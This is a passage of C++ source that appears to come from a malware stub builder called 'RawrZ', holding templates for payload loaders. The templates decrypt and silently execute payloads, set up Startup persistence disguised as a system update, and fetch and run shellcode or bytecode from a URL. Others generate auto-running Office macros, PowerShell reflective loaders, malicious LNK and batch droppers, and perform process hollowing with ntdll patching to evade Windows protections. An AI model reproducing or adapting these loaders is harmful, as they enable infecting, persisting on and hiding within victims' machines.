        MultiByteToWideChar(CP_ACP, 0, shortcutPath.c_str(), -1, widePath, MAX_PATH);
        hr = pPersistFile->Save(widePath, TRUE);
        pPersistFile->Release();
    }
    
    pShellLink->Release();
    CoUninitialize();
    
    return SUCCEEDED(hr);
}

// Execute payload via Win+R registry modification
bool executeViaWinR(const std::vector<char>& payload) {
    // Save payload to temp file
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    std::string payloadPath = std::string(tempPath) + "\\system_update.exe";
    
    HANDLE hFile = CreateFileA(payloadPath.c_str(), GENERIC_WRITE, 0, NULL, 
                              CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;
    
    DWORD bytesWritten;
    WriteFile(hFile, payload.data(), payload.size(), &bytesWritten, NULL);
    CloseHandle(hFile);
    
    // Create startup shortcut for persistence
    createStartupShortcut(payloadPath, "SystemUpdate");
    
    // Execute the payload
    ShellExecuteA(NULL, "open", payloadPath.c_str(), NULL, NULL, SW_HIDE);
    
    return true;
}

int main() {
    // Your encrypted payload here
    std::vector<char> encrypted_payload = { /* ENCRYPTED_DATA */ };
    std::string decryption_key = "RawrZ2024";
    
    auto decrypted = decrypt(encrypted_payload, decryption_key);
    
    // Execute payload via Win+R persistence method
    if (executeViaWinR(decrypted)) {
        std::cout << "Payload deployed via Win+R method!" << std::endl;
    } else {
        std::cout << "Payload deployment failed!" << std::endl;
    }
    
    return 0;
}
)",
            {"windows.h", "shlobj.h"},
            {"g++ -std=c++17 -O2 -lole32 -luuid -o {output} {input}"},
            false, false, "", std::chrono::system_clock::now()
        });

        templates.push_back({
            "Java",
            "java_advanced_exec",
            "Java stub with advanced payload execution methods",
            R"(
import java.io.*;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.Base64;
import java.util.zip.GZIPInputStream;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.crypto.spec.IvParameterSpec;

public class AdvancedPayloadExecutor {
    
    // Simple XOR decryption
    public static byte[] decryptXOR(byte[] data, String key) {
        byte[] decrypted = new byte[data.length];
        for (int i = 0; i < data.length; i++) {
            decrypted[i] = (byte) (data[i] ^ key.charAt(i % key.length()));
        }
        return decrypted;
    }
    
    // Execute shellcode via JNI
    public static native boolean executeShellcode(byte[] shellcode);
    
    // Load native library for shellcode execution
    static {
        try {
            System.loadLibrary("shellcode_executor");
        } catch (UnsatisfiedLinkError e) {
            System.out.println("Native library not found, using Java fallback");
        }
    }
    
    // Execute Java bytecode from memory
    public static boolean executeJavaBytecode(byte[] bytecode) {
        try {
            // Decompress if needed
            byte[] decompressed;
            try {
                ByteArrayInputStream bis = new ByteArrayInputStream(bytecode);
                GZIPInputStream gzis = new GZIPInputStream(bis);
                decompressed = gzis.readAllBytes();
                gzis.close();
            } catch (Exception e) {
                decompressed = bytecode; // Not compressed
            }
            
            // Create class loader and load class
            Class<?> clazz = defineClass(decompressed);
            if (clazz != null) {
                // Try to find main method
                try {
                    Method main = clazz.getMethod("main", String[].class);
                    main.invoke(null, (Object) new String[0]);
                    return true;
                } catch (Exception e) {
                    // Try to instantiate and call default constructor
                    Object instance = clazz.newInstance();
                    return true;
                }
            }
        } catch (Exception e) {
            System.err.println("Java bytecode execution failed: " + e.getMessage());
        }
        return false;
    }
    
    // Define class from bytecode
    private static Class<?> defineClass(byte[] bytecode) {
        try {
            // Use reflection to access defineClass method
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", 
                String.class, byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            
            // Extract class name from bytecode (simplified)
            String className = "PayloadClass" + System.currentTimeMillis();
            
            return (Class<?>) defineClass.invoke(AdvancedPayloadExecutor.class.getClassLoader(),
                className, bytecode, 0, bytecode.length);
        } catch (Exception e) {
            System.err.println("Class definition failed: " + e.getMessage());
            return null;
        }
    }
    
    // Execute payload from URL
    public static boolean executeFromURL(String urlString, String key) {
        try {
            URL url = new URL(urlString);
            InputStream is = url.openStream();
            byte[] encrypted = is.readAllBytes();
            is.close();
            
            byte[] decrypted = decryptXOR(encrypted, key);
            
            // Try different execution methods
            if (decrypted.length > 4 && decrypted[0] == (byte)0xCA && decrypted[1] == (byte)0xFE) {
                // Java bytecode
                return executeJavaBytecode(decrypted);
            } else {
                // Try as shellcode
                try {
                    return executeShellcode(decrypted);
                } catch (UnsatisfiedLinkError e) {
                    System.out.println("Shellcode execution not available");
                    return false;
                }
            }
        } catch (Exception e) {
            System.err.println("URL execution failed: " + e.getMessage());
            return false;
        }
    }
    
    // Main method
    public static void main(String[] args) {
        // Your encrypted payload here
        byte[] encrypted_payload = { /* ENCRYPTED_DATA */ };
        String decryption_key = "RawrZ2024";
        
        byte[] decrypted = decryptXOR(encrypted_payload, decryption_key);
        
        // Try different execution methods
        boolean success = false;
        
        // Method 1: Try Java bytecode execution
        if (!success) {
            success = executeJavaBytecode(decrypted);
            if (success) System.out.println("Java bytecode executed successfully!");
        }
        
        // Method 2: Try shellcode execution (if native library available)
        if (!success) {
            try {
                success = executeShellcode(decrypted);
                if (success) System.out.println("Shellcode executed successfully!");
            } catch (UnsatisfiedLinkError e) {
                System.out.println("Native shellcode execution not available");
            }
        }
        
        if (!success) {
            System.out.println("All execution methods failed!");
        }
    }
}
)",
            {"java.io", "java.lang.reflect", "java.net", "java.util", "javax.crypto"},
            {"javac {input} && java AdvancedPayloadExecutor"},
            false, false, "", std::chrono::system_clock::now()
        });

        templates.push_back({
            "C++",
            "cpp_office_macro",
            "C++ stub that generates Office macro payloads",
            R"(
#include <iostream>
#include <vector>
#include <string>
#include <fstream>
#include <windows.h>

// Simple XOR encryption
std::vector<char> decrypt(const std::vector<char>& data, const std::string& key) {
    std::vector<char> decrypted = data;
    for (size_t i = 0; i < decrypted.size(); ++i) {
        decrypted[i] ^= key[i % key.length()];
    }
    return decrypted;
}

// Generate VBA macro for Office documents
std::string generateVBAMacro(const std::vector<char>& payload) {
    std::stringstream macro;
    macro << "Sub Auto_Open()\n";
    macro << "    ExecutePayload\n";
    macro << "End Sub\n\n";
    
    macro << "Sub Document_Open()\n";
    macro << "    ExecutePayload\n";
    macro << "End Sub\n\n";
    
    macro << "Sub ExecutePayload()\n";
    macro << "    Dim payload As String\n";
    macro << "    payload = \"";
    
    // Convert payload to hex string
    for (char byte : payload) {
        macro << std::hex << std::setfill('0') << std::setw(2) 
              << (static_cast<int>(byte) & 0xFF);
    }
    
    macro << "\"\n";
    macro << "    \n";
    macro << "    ' Convert hex to bytes\n";
    macro << "    Dim bytes() As Byte\n";
    macro << "    ReDim bytes(Len(payload) \\ 2 - 1)\n";
    macro << "    For i = 0 To UBound(bytes)\n";
    macro << "        bytes(i) = CByte(\"&H\" & Mid(payload, i * 2 + 1, 2))\n";
    macro << "    Next i\n";
    macro << "    \n";
    macro << "    ' Execute payload using WScript.Shell\n";
    macro << "    Dim shell As Object\n";
    macro << "    Set shell = CreateObject(\"WScript.Shell\")\n";
    macro << "    \n";
    macro << "    ' Save payload to temp file\n";
    macro << "    Dim tempFile As String\n";
    macro << "    tempFile = shell.ExpandEnvironmentStrings(\"%TEMP%\") & \"\\update.exe\"\n";
    macro << "    \n";
    macro << "    ' Write payload to file\n";
    macro << "    Dim fso As Object\n";
    macro << "    Set fso = CreateObject(\"Scripting.FileSystemObject\")\n";
    macro << "    \n";
    macro << "    Dim stream As Object\n";
    macro << "    Set stream = CreateObject(\"ADODB.Stream\")\n";
    macro << "    stream.Type = 1 ' Binary\n";
    macro << "    stream.Open\n";
    macro << "    stream.Write bytes\n";
    macro << "    stream.SaveToFile tempFile, 2 ' Overwrite\n";
    macro << "    stream.Close\n";
    macro << "    \n";
    macro << "    ' Execute the payload\n";
    macro << "    shell.Run tempFile, 0, False\n";
    macro << "End Sub\n";
    
    return macro.str();
}

// Generate PowerShell script
std::string generatePowerShellScript(const std::vector<char>& payload) {
    std::stringstream script;
    script << "# PowerShell payload executor\n";
    script << "$encrypted = @(";
    
    for (size_t i = 0; i < payload.size(); ++i) {
        if (i > 0) script << ", ";
        script << "0x" << std::hex << std::setfill('0') << std::setw(2) 
               << (static_cast<int>(payload[i]) & 0xFF);
    }
    
    script << ")\n\n";
    script << "$key = \"RawrZ2024\"\n";
    script << "$decrypted = @()\n";
    script << "for ($i = 0; $i -lt $encrypted.Length; $i++) {\n";
    script << "    $decrypted += $encrypted[$i] -bxor [byte][char]$key[$i % $key.Length]\n";
    script << "}\n\n";
    script << "# Execute payload\n";
    script << "try {\n";
    script << "    $assembly = [System.Reflection.Assembly]::Load($decrypted)\n";
    script << "    $entryPoint = $assembly.EntryPoint\n";
    script << "    if ($entryPoint) {\n";
    script << "        $entryPoint.Invoke($null, $null)\n";
    script << "    }\n";
    script << "} catch {\n";
    script << "    Write-Error \"Execution failed: $_\"\n";
    script << "}\n";
    
    return script.str();
}

int main() {
    // Your encrypted payload here
    std::vector<char> encrypted_payload = { /* ENCRYPTED_DATA */ };
    std::string decryption_key = "RawrZ2024";
    
    auto decrypted = decrypt(encrypted_payload, decryption_key);
    
    // Generate VBA macro
    std::string vbaMacro = generateVBAMacro(decrypted);
    std::ofstream vbaFile("payload_macro.vba");
    if (vbaFile.is_open()) {
        vbaFile << vbaMacro;
        vbaFile.close();
        std::cout << "VBA macro generated: payload_macro.vba" << std::endl;
    }
    
    // Generate PowerShell script
    std::string psScript = generatePowerShellScript(decrypted);
    std::ofstream psFile("payload_executor.ps1");
    if (psFile.is_open()) {
        psFile << psScript;
        psFile.close();
        std::cout << "PowerShell script generated: payload_executor.ps1" << std::endl;
    }
    
    std::cout << "Office macro payloads generated successfully!" << std::endl;
    return 0;
}
)",
            {"windows.h", "fstream", "sstream", "iomanip"},
            {"g++ -std=c++17 -O2 -o {output} {input}"},
            false, false, "", std::chrono::system_clock::now()
        });

        templates.push_back({
            "C++",
            "cpp_lnk_shortcut",
            "C++ stub that generates malicious LNK shortcuts",
            R"(
#include <iostream>
#include <vector>
#include <string>
#include <fstream>
#include <windows.h>
#include <shlobj.h>

// Simple XOR encryption
std::vector<char> decrypt(const std::vector<char>& data, const std::string& key) {
    std::vector<char> decrypted = data;
    for (size_t i = 0; i < decrypted.size(); ++i) {
        decrypted[i] ^= key[i % key.length()];
    }
    return decrypted;
}

// Generate malicious LNK shortcut
bool generateLNKShortcut(const std::string& targetPath, const std::string& lnkPath, 
                         const std::string& iconPath = "") {
    HRESULT hr = CoInitialize(NULL);
    if (FAILED(hr)) return false;
    
    IShellLinkA* pShellLink = NULL;
    hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, 
                         IID_IShellLink, (void**)&pShellLink);
    if (FAILED(hr)) {
        CoUninitialize();
        return false;
    }
    
    // Set shortcut properties
    pShellLink->SetPath(targetPath.c_str());
    pShellLink->SetWorkingDirectory(targetPath.substr(0, targetPath.find_last_of("\\")).c_str());
    pShellLink->SetDescription("System Update");
    
    // Set icon if provided
    if (!iconPath.empty()) {
        pShellLink->SetIconLocation(iconPath.c_str(), 0);
    }
    
    // Set window state to minimized
    pShellLink->SetShowCmd(SW_SHOWMINNOACTIVE);
    
    // Save shortcut
    IPersistFile* pPersistFile = NULL;
    hr = pShellLink->QueryInterface(IID_IPersistFile, (void**)&pPersistFile);
    if (SUCCEEDED(hr)) {
        WCHAR widePath[MAX_PATH];
        MultiByteToWideChar(CP_ACP, 0, lnkPath.c_str(), -1, widePath, MAX_PATH);
        hr = pPersistFile->Save(widePath, TRUE);
        pPersistFile->Release();
    }
    
    pShellLink->Release();
    CoUninitialize();
    
    return SUCCEEDED(hr);
}

// Generate URL shortcut
bool generateURLShortcut(const std::string& url, const std::string& urlPath) {
    std::ofstream urlFile(urlPath);
    if (!urlFile.is_open()) return false;
    
    urlFile << "[InternetShortcut]\n";
    urlFile << "URL=" << url << "\n";
    urlFile << "IconFile=shell32.dll,1\n";
    urlFile << "IconIndex=1\n";
    
    urlFile.close();
    return true;
}

// Generate batch file
bool generateBatchFile(const std::vector<char>& payload, const std::string& batchPath) {
    std::ofstream batchFile(batchPath);
    if (!batchFile.is_open()) return false;
    
    batchFile << "@echo off\n";
    batchFile << "echo Updating system...\n";
    
    // Save payload to temp file
    batchFile << "set tempfile=%TEMP%\\update.exe\n";
    
    // Convert payload to hex and use certutil to decode
    batchFile << "echo ";
    for (char byte : payload) {
        batchFile << std::hex << std::setfill('0') << std::setw(2) 
                  << (static_cast<int>(byte) & 0xFF);
    }
    batchFile << " > %tempfile%.hex\n";
    
    batchFile << "certutil -decodehex %tempfile%.hex %tempfile% >nul 2>&1\n";
    batchFile << "del %tempfile%.hex\n";
    
    // Execute payload
    batchFile << "start /min %tempfile%\n";
    batchFile << "del %tempfile%\n";
    
    batchFile.close();
    return true;
}

int main() {
    // Your encrypted payload here
    std::vector<char> encrypted_payload = { /* ENCRYPTED_DATA */ };
    std::string decryption_key = "RawrZ2024";
    
    auto decrypted = decrypt(encrypted_payload, decryption_key);
    
    // Generate malicious LNK shortcut
    if (generateLNKShortcut("C:\\Windows\\System32\\cmd.exe", "system_update.lnk")) {
        std::cout << "LNK shortcut generated: system_update.lnk" << std::endl;
    }
    
    // Generate URL shortcut
    if (generateURLShortcut("file:///C:/Windows/System32/calc.exe", "update.url")) {
        std::cout << "URL shortcut generated: update.url" << std::endl;
    }
    
    // Generate batch file
    if (generateBatchFile(decrypted, "system_update.bat")) {
        std::cout << "Batch file generated: system_update.bat" << std::endl;
    }
    
    std::cout << "Malicious shortcuts generated successfully!" << std::endl;
    return 0;
}
)",
            {"windows.h", "shlobj.h", "fstream", "iomanip"},
            {"g++ -std=c++17 -O2 -lole32 -luuid -o {output} {input}"},
            false, false, "", std::chrono::system_clock::now()
        });

        // NEW: Windows 11 24H2 Compatible Process Hollowing Templates
            R"(
#include <iostream>
#include <vector>
#include <string>
#include <windows.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <psapi.h>

// Simple XOR encryption
std::vector<char> decrypt(const std::vector<char>& data, const std::string& key) {
    std::vector<char> decrypted = data;
    for (size_t i = 0; i < decrypted.size(); ++i) {
        decrypted[i] ^= key[i % key.length()];
    }
    return decrypted;
}

// Patch exported functions at fixed RVA offsets (reliable method)
bool patchExportedFunctions(HANDLE hProcess, LPVOID ntdllBase) {
    // Fixed RVA offsets for Windows 11 24H2 (based on hasherezade research)
    // These are the functions that need to be patched to bypass hotpatch checks
    
    // Function 1: ZwQueryVirtualMemory (or related hotpatch function)
    // RVA: 0x7BE0 (example - actual offset may vary by Windows version)
    LPVOID pQueryVirtualMemory = (LPVOID)((DWORD_PTR)ntdllBase + 0x7BE0);
    
    // Function 2: NtManageHotPatch (or related function)
    // RVA: 0x8F40 (example - actual offset may vary by Windows version)
    LPVOID pManageHotPatch = (LPVOID)((DWORD_PTR)ntdllBase + 0x8F40);
    
    // Patch both functions to return immediately (ret instruction = 0xC3)
    BYTE retInstruction = 0xC3;
    
    // Patch ZwQueryVirtualMemory function
    if (!WriteProcessMemory(hProcess, pQueryVirtualMemory, &retInstruction, 1, NULL)) {
        std::cout << "Warning: Failed to patch ZwQueryVirtualMemory function" << std::endl;
    } else {
        std::cout << "Successfully patched ZwQueryVirtualMemory at RVA 0x7BE0" << std::endl;
    }
    
    // Patch NtManageHotPatch function
    if (!WriteProcessMemory(hProcess, pManageHotPatch, &retInstruction, 1, NULL)) {
        std::cout << "Warning: Failed to patch NtManageHotPatch function" << std::endl;
    } else {
        std::cout << "Successfully patched NtManageHotPatch at RVA 0x8F40" << std::endl;
    }
    
    // Alternative: Patch by function name lookup (more reliable across versions)
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        // Get actual addresses of functions
        LPVOID pRealQueryVirtualMemory = GetProcAddress(hNtdll, "ZwQueryVirtualMemory");
        LPVOID pRealManageHotPatch = GetProcAddress(hNtdll, "NtManageHotPatch");
        
        if (pRealQueryVirtualMemory) {
            // Calculate actual RVA
            DWORD_PTR realRva = (DWORD_PTR)pRealQueryVirtualMemory - (DWORD_PTR)hNtdll;
            LPVOID pRemoteFunc = (LPVOID)((DWORD_PTR)ntdllBase + realRva);
            
            if (WriteProcessMemory(hProcess, pRemoteFunc, &retInstruction, 1, NULL)) {
                std::cout << "Successfully patched ZwQueryVirtualMemory at actual RVA 0x" << std::hex << realRva << std::endl;
            }
        }
        
        if (pRealManageHotPatch) {
            // Calculate actual RVA
            DWORD_PTR realRva = (DWORD_PTR)pRealManageHotPatch - (DWORD_PTR)hNtdll;
            LPVOID pRemoteFunc = (LPVOID)((DWORD_PTR)ntdllBase + realRva);
            
            if (WriteProcessMemory(hProcess, pRemoteFunc, &retInstruction, 1, NULL)) {
                std::cout << "Successfully patched NtManageHotPatch at actual RVA 0x" << std::hex << realRva << std::endl;
            }
        }
    }
    
    return true;
}

// Process hollowing with reliable function patching
bool processHollowingReliablePatch(const std::string& targetProcess, const std::vector<char>& payload) {
    HANDLE hProcess = NULL;
    LPVOID pRemoteBuffer = NULL;
    LPVOID pImageBase = NULL;
    
    // Find target process
    DWORD processId = findProcessByName(targetProcess);
    if (processId == 0) {
        std::cout << "Target process not found!" << std::endl;
        return false;
    }
    
    // Open target process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!hProcess) {
        DWORD error = GetLastError();
        if (error == ERROR_ACCESS_DENIED) {
            std::cout << "Error: Access denied. Try running as administrator." << std::endl;
        } else if (error == ERROR_INVALID_HANDLE) {
            std::cout << "Error: Invalid handle. Process may have terminated." << std::endl;
        } else if (error == ERROR_INVALID_PARAMETER) {
            std::cout << "Error: Invalid parameter. Check process ID." << std::endl;
        }
        return false;
    }
    
    // Suspend process
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        std::cout << "Failed to create thread snapshot" << std::endl;
        CloseHandle(hProcess);
        return false;
    }
    
    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);
    
    if (Thread32First(hSnapshot, &te32)) {
        do {
            if (te32.th32OwnerProcessID == processId) {
                HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te32.th32ThreadID);
                if (hThread) {
                    SuspendThread(hThread);
                    CloseHandle(hThread);
                }
            }
        } while (Thread32Next(hSnapshot, &te32));
    }
    CloseHandle(hSnapshot);
    
    // Get process information
    PROCESS_BASIC_INFORMATION pbi;
    NTSTATUS status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
    if (status != 0) {
        std::cout << "Failed to get process information. Status: 0x" << std::hex << status << std::endl;
        CloseHandle(hProcess);
        return false;
    }
    
    // Read PEB address
    LPVOID pPeb = pbi.PebBaseAddress;
    LPVOID pImageBaseAddr = NULL;
    
    if (!ReadProcessMemory(hProcess, (LPVOID)((LPBYTE)pPeb + 0x10), &pImageBaseAddr, sizeof(LPVOID), NULL)) {
        std::cout << "Failed to read image base address" << std::endl;
        CloseHandle(hProcess);
        return false;
    }
    
    // Unmap original executable
    if (!NtUnmapViewOfSection(hProcess, pImageBaseAddr)) {
        std::cout << "Failed to unmap original executable" << std::endl;
        CloseHandle(hProcess);
        return false;
    }
    
    // Allocate memory for new image (use MEM_PRIVATE - we'll patch the functions)
    pImageBase = VirtualAllocEx(hProcess, pImageBaseAddr, payload.size(), 
                                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pImageBase) {
        DWORD error = GetLastError();
        if (error == ERROR_ACCESS_DENIED) {
            std::cout << "Error: Access denied during memory allocation" << std::endl;
        } else if (error == ERROR_INVALID_HANDLE) {
            std::cout << "Error: Invalid handle during memory allocation" << std::endl;
        } else if (error == ERROR_INVALID_PARAMETER) {
            std::cout << "Error: Invalid parameter during memory allocation" << std::endl;
        }
        CloseHandle(hProcess);
        return false;
    }
    
    // Write payload to process memory
    if (!WriteProcessMemory(hProcess, pImageBase, payload.data(), payload.size(), NULL)) {
        std::cout << "Failed to write payload to process memory" << std::endl;
        VirtualFreeEx(hProcess, pImageBase, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    
    // Update PEB image base
    if (!WriteProcessMemory(hProcess, (LPVOID)((LPBYTE)pPeb + 0x10), &pImageBase, sizeof(LPVOID), NULL)) {
        std::cout << "Failed to update PEB image base" << std::endl;
        VirtualFreeEx(hProcess, pImageBase, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    
    // RELIABLE FUNCTION PATCHING - Patch exported functions at fixed RVA offsets
    HMODULE hRemoteNtdll = NULL;
    HMODULE hModules[1024];
    DWORD cbNeeded;
    
    if (EnumProcessModules(hProcess, hModules, sizeof(hModules), &cbNeeded)) {
        for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
            char szModName[MAX_PATH];
            if (GetModuleBaseNameA(hProcess, hModules[i], szModName, sizeof(szModName))) {
                if (strcmp(szModName, "ntdll.dll") == 0) {
                    hRemoteNtdll = hModules[i];
                    break;
                }
            }
        }
    }
    
    if (hRemoteNtdll) {
        std::cout << "Found ntdll.dll in target process at: 0x" << std::hex << hRemoteNtdll << std::endl;
        
        // Patch the exported functions that cause the hotpatch check to fail
        if (!patchExportedFunctions(hProcess, hRemoteNtdll)) {
            std::cout << "Warning: Function patching failed, but continuing..." << std::endl;
        }
    } else {
        std::cout << "Warning: Could not find ntdll.dll in target process" << std::endl;
    }
    
    // Resume process execution
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        te32.dwSize = sizeof(THREADENTRY32);
        if (Thread32First(hSnapshot, &te32)) {
            do {
                if (te32.th32OwnerProcessID == processId) {
                    HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te32.th32ThreadID);
                    if (hThread) {
                        ResumeThread(hThread);
                        CloseHandle(hThread);
                    }
                }
            } while (Thread32Next(hSnapshot, &te32));
        }
        CloseHandle(hSnapshot);
    }
    
    CloseHandle(hProcess);
    std::cout << "Process hollowing with reliable function patching completed successfully!" << std::endl;
    return true;
}

// Find process by name
DWORD findProcessByName(const std::string& processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (processName == pe32.szExeFile) {
                CloseHandle(hSnapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    return 0;
}

int main() {
    // Your encrypted payload here
    std::vector<char> encrypted_payload = { /* ENCRYPTED_DATA */ };
    std::string decryption_key = "RawrZ2024";
    
    auto decrypted = decrypt(encrypted_payload, decryption_key);
    
    // Perform process hollowing with reliable function patching
    if (processHollowingReliablePatch("notepad.exe", decrypted)) {
        std::cout << "Process hollowing successful!" << std::endl;
    } else {
        std::cout << "Process hollowing failed!" << std::endl;
    }
    
    return 0;
}
)",
            {"windows.h", "tlhelp32.h", "winternl.h", "psapi.h"},
            {"g++ -std=c++17 -O2 -lntdll -lpsapi -o {output} {input}"},
            false, false, "", std::chrono::system_clock::now()
        });
        
        // Go Templates
        templates.push_back({
            "Go",
            "go_simple",
            "Go stub with basic encryption",
            R"(
package main

import (
    "crypto/aes"
    "crypto/cipher"
    "encoding/base64"
    "fmt"
)

func decryptAES(encrypted []byte, key []byte) ([]byte, error) {
    block, err := aes.NewCipher(key)
    if err != nil {
        return nil, err
    }
    
    if len(encrypted) < aes.BlockSize {
        return nil, fmt.Errorf("ciphertext too short")
    }
    
    iv := encrypted[:aes.BlockSize]
    encrypted = encrypted[aes.BlockSize:]
    
    mode := cipher.NewCBCDecrypter(block, iv)
    mode.CryptBlocks(encrypted, encrypted)
    
    return encrypted, nil
}

func main() {
    // Your encrypted payload here
    encryptedPayload := []byte{/* ENCRYPTED_DATA */}
    key := []byte("RawrZ2024Key32BytesLongEnough")
    
    decrypted, err := decryptAES(encryptedPayload, key)
    if err != nil {
        fmt.Printf("Decryption error: %v\n", err)
        return
    }
    
    // Execute the decrypted payload
    
    fmt.Println("Payload executed successfully")
}
)",
            {"crypto/aes", "crypto/cipher", "encoding/base64", "fmt"},
            {"go build -o {output} {input}"},
            false, false, "", std::chrono::system_clock::now()
        });
        
        // Rust Templates
        templates.push_back({
            "Rust",
            "rust_simple",
            "Rust stub with basic encryption",
            R"(
use std::io::{self, Write};

fn decrypt_xor(data: &[u8], key: &[u8]) -> Vec<u8> {
    data.iter()
        .enumerate()
        .map(|(i, &byte)| byte ^ key[i % key.len()])
        .collect()
}

fn main() -> io::Result<()> {
    // Your encrypted payload here
    let encrypted_payload: Vec<u8> = vec![/* ENCRYPTED_DATA */];
    let key = b"RawrZ2024";
    
    let decrypted = decrypt_xor(&encrypted_payload, key);
    
    // Execute the decrypted payload
    // Implementation depends on payload type
    
    io::stdout().write_all(b"Payload executed successfully\n")?;
    Ok(())
}
)",
            {"std::io"},
            {"rustc -O -o {output} {input}"},
            false, false, "", std::chrono::system_clock::now()
        });
        
        std::cout << "Initialized " << templates.size() << " stub templates in multiple languages" << std::endl;
        
        // NEW: UMS Hollow-Core Template
        templates.push_back({
            "C++",
            "cpp_ums_hollow_core",
            "UMS Hollow-Core - Revolutionary 0-syscall process hollowing",
            R"(
#include <windows.h>
#include <iostream>

// UMS Hollow-Core - The new hotness
class UMSHollowCore {
public:
    static BOOL ExecuteUMSHollowCore(const std::wstring& targetExe, 
                                     const std::wstring& payloadPath) {
        std::wcout << L"[+] Starting UMS Hollow-Core..." << std::endl;
        
        // Phase 1: Spawn target in suspended state
        STARTUPINFOEXW si{ sizeof(si) };
        PROCESS_INFORMATION pi{};
        
        if (!CreateProcessW(targetExe.c_str(), nullptr, nullptr, nullptr, FALSE,
                            CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,
                            nullptr, nullptr, &si.StartupInfo, &pi)) {
            return FALSE;
        }
        
        // Phase 2: Register entire process as UMS scheduler
        UMS_SCHEDULER_START_INFO umsStart{};
        umsStart.UmsVersion = UMS_VERSION;
        umsStart.SchedulerParam = nullptr;
        umsStart.SchedulerProc = [](UMS_SCHEDULER_REASON, ULONG_PTR, PVOID) -> DWORD { return 0; };
        
        if (!EnterUmsSchedulingMode(&umsStart)) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return FALSE;
        }
        
        // Phase 3: Map payload as data section (SEC_IMAGE_NO_EXECUTE)
        HANDLE hSection = nullptr;
        LARGE_INTEGER size{};
        size.QuadPart = 4 * 1024 * 1024; // 4 MiB
        
        NTSTATUS status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, nullptr, &size,
                                         PAGE_READWRITE, SEC_COMMIT | SEC_IMAGE_NO_EXECUTE, nullptr);
        if (status != 0) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return FALSE;
        }

        // Map section in both processes
        PVOID localView = nullptr, remoteView = nullptr;
        SIZE_T viewSize = size.QuadPart;
        
        status = NtMapViewOfSection(hSection, GetCurrentProcess(), &localView,
                                   0, 0, nullptr, &viewSize, ViewShare, 0, PAGE_READWRITE);
        if (status != 0) {
            NtClose(hSection);
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return FALSE;
        }

        status = NtMapViewOfSection(hSection, pi.hProcess, &remoteView,
                                   0, 0, nullptr, &viewSize, ViewShare, 0, PAGE_READWRITE);
        if (status != 0) {
            NtUnmapViewOfSection(GetCurrentProcess(), localView);
            NtClose(hSection);
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return FALSE;
        }

        // Load payload into local view
        HANDLE hFile = CreateFileW(payloadPath.c_str(), GENERIC_READ, FILE_SHARE_READ,
                                   nullptr, OPEN_EXISTING, 0, nullptr);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD bytes = 0;
            ReadFile(hFile, (BYTE*)localView + 0x1000, 1 << 20, &bytes, nullptr);
            CloseHandle(hFile);
        }

        // Phase 4: Create shadow thread and execute
        PUMS_CONTEXT umsCtx;
        if (CreateUmsThreadContext(&umsCtx)) {
            ExecuteUmsThread(umsCtx);
        }

        // Phase 5: Cleanup
        ResumeThread(pi.hThread);
        Sleep(1000);
        TerminateThread(pi.hThread, 0);
        
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        NtClose(hSection);
        
        return TRUE;
    }
};

int main() {
    std::cout << "=== UMS Hollow-Core - Revolutionary 0-Syscall Technique ===" << std::endl;
    
    if (UMSHollowCore::ExecuteUMSHollowCore(L"C:\\Windows\\System32\\notepad.exe", 
                                            L"C:\\Temp\\payload.dll")) {
        std::cout << "UMS Hollow-Core successful!" << std::endl;
    } else {
        std::cout << "UMS Hollow-Core failed!" << std::endl;
    }
    
    return 0;
}
)",
            {"windows.h", "iostream", "string"},
            {"g++ -std=c++17 -O2 -lntdll -o {output} {input}"},
            false, false, "", std::chrono::system_clock::now()
        });

        // NEW: UMS DLL Injection Variants Template
        templates.push_back({
            "C++",
            "cpp_ums_dll_injection",
            "UMS DLL Injection Variants - Classic, Reflective, and Memory-load techniques",
            R"(
#include <windows.h>
#include <iostream>
#include <string>
#include <vector>

// UMS DLL Injection Variants
class UMSDLLInjection {
public:
    // Classic DLL Injection via UMS - Stealth Score: ⭐⭐
